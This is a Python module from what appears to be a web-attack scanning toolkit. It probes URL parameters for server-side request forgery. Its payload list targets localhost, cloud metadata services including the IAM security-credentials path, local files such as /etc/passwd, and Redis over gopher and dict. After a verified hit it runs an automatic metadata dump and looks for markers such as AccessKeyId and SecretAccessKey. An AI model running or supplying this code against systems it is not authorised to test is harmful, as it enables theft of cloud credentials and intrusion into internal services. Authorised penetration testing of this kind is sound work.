"""ssrf — SSRF scanner on Probe v2 with verify + auto-dump"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.probe import Probe

PAYLOADS = [
    "http://127.0.0.1/", "http://localhost/", "http://[::1]/",
    "http://0x7f000001/", "http://0177.0.0.1/", "http://2130706433/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "file:///etc/passwd", "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/info",
    "http://127.0.0.1:6379/", "http://127.0.0.1:11211/",
    "http://127.0.0.1:9200/", "http://127.0.0.1:2375/version",
]

MARKERS = [
    "ami-id", "instance-id", "security-credentials", "computeMetadata", "vmId",
    "root:x:0:0", "redis_version", "elasticsearch", "memcached",
    "project-id", "service-accounts",
    "AccessKeyId", "SecretAccessKey",
]

class Ssrf:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        params = parse_qs(u.query) or {"url": ["http://example.com"]}

        probe = Probe(session, logger)
        base = probe.baseline_probe(target)
        if not base:
            print("[ssrf] no baseline"); return {"findings": []}
        print(f"[ssrf] baseline: {base['code']} {base['len']}b")
        print(f"[ssrf] {len(PAYLOADS)} payloads on {list(params.keys())}")

        findings = []
        vuln_param = None

        for name in params:
            for p in PAYLOADS:
                url_fn = lambda pl, u=u, params=params, name=name: urlunparse(
                    u._replace(query=urlencode({**{k: v[0] for k, v in params.items()}, name: pl}, doseq=True))
                )
                r = probe.inject(url_fn, p, detect_markers=MARKERS)
                if not r["hit"] or not r["reason"].startswith("marker:"):
                    continue

                verified = probe.verify(url_fn, p, detect_markers=MARKERS, times=2)
                if not verified:
                    print(f"  · unverified: {p[:50]}"); continue

                marker = r["reason"].split(":", 1)[1]
                sev = probe.escalate_severity("critical", r,
                       r.get("response").text if r.get("response") is not None else "")
                print(f"  ✓ [{sev}] {name}={p[:60]} -> {marker}")
                findings.append({"param": name, "payload": p, "marker": marker,
                                 "severity": sev, "verified": True})
                logger.finding("ssrf", sev, f"{name}={p[:60]} marker={marker}")
                vuln_param = name
                break
            if vuln_param:
                break

        if vuln_param:
            print(f"\n[ssrf] vulnerable: {vuln_param} — auto-dump metadata")
            probe.auto_dump({"kind": "ssrf"}, target, vuln_param)

        print(f"\n[ssrf] total: {len(findings)} verified")
        print(f"[ssrf] stats: {probe.summary()}")
        return {"findings": findings, "param": vuln_param, "stats": probe.summary()}
